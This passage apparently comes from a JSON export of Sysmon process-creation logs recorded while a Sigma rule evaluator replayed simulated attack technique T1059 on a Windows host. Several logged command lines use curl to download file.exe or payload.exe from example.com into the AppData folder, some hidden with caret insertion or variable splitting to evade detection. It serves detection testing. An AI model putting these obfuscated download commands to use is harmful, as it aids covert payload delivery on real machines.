      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_011.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D33A-6A2E-E204-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:13:46.344715Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:13:46.328",
      "Version": 5
    },
    {
      "row_id": 105,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://example.com/file.exe -o %%APPDATA%%\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203061,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_011.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\\file.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D33A-6A2E-E204-000000002C00",
      "ParentProcessId": 8036,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D33A-6A2E-E304-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:13:46.396841Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:13:46.371",
      "Version": 5
    },
    {
      "row_id": 106,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=%%USERPROFILE%%\\AppData\\Roaming\\file.exe&& call curl %%protocol%%%%url%% -o %%dest%%\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203106,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_012.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D353-6A2E-F904-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:14:11.513449Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:11.437",
      "Version": 5
    },
    {
      "row_id": 107,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/file.exe -o C:\\Users\\thaim\\AppData\\Roaming\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203107,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_012.evtx",
      "ParentCommandLine": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\\AppData\\Roaming\\file.exe&& call curl %protocol%%url% -o %dest%\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D353-6A2E-F904-000000002C00",
      "ParentProcessId": 3196,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D353-6A2E-FA04-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:14:11.670774Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:11.576",
      "Version": 5
    },
    {
      "row_id": 108,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"set protocol=http&& set url=://example.com/file.exe&& set dest=%%USERPROFILE%%\\AppData\\Roaming\\file.exe&& call curl %%protocol%%%%url%% -o %%dest%%\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203155,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_013.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D36C-6A2E-1305-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:14:36.539715Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:36.510",
      "Version": 5
    },
    {
      "row_id": 109,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/file.exe -o C:\\Users\\thaim\\AppData\\Roaming\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203156,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_013.evtx",
      "ParentCommandLine": "cmd.exe /C \"set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\\AppData\\Roaming\\file.exe&& call curl %protocol%%url% -o %dest%\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D36C-6A2E-1305-000000002C00",
      "ParentProcessId": 1896,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D36C-6A2E-1405-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:14:36.607360Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:14:36.567",
      "Version": 5
    },
    {
      "row_id": 110,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %%AppData%%\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203217,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_015.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D38C-6A2E-3205-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:15:08.106192Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:08.083",
      "Version": 5
    },
    {
      "row_id": 111,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://[example.com/payload.exe]() -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203218,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_015.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D38C-6A2E-3205-000000002C00",
      "ParentProcessId": 6864,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D38C-6A2E-3305-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:15:08.151415Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:08.130",
      "Version": 5
    },
    {
      "row_id": 112,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %%AppData%%\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203258,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_016.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3A2-6A2E-4605-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:15:30.704368Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:30.682",
      "Version": 5
    },
    {
      "row_id": 113,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://[example.com/payload.exe]() -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203259,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_016.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3A2-6A2E-4605-000000002C00",
      "ParentProcessId": 4400,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3A2-6A2E-4705-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:15:30.767255Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:30.751",
      "Version": 5
    },
    {
      "row_id": 114,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl http://example.com/payload.exe -o %%USERPROFILE%%\\AppData\\Roaming\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203306,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_017.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3BC-6A2E-5D05-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:15:56.078601Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:56.003",
      "Version": 5
    },
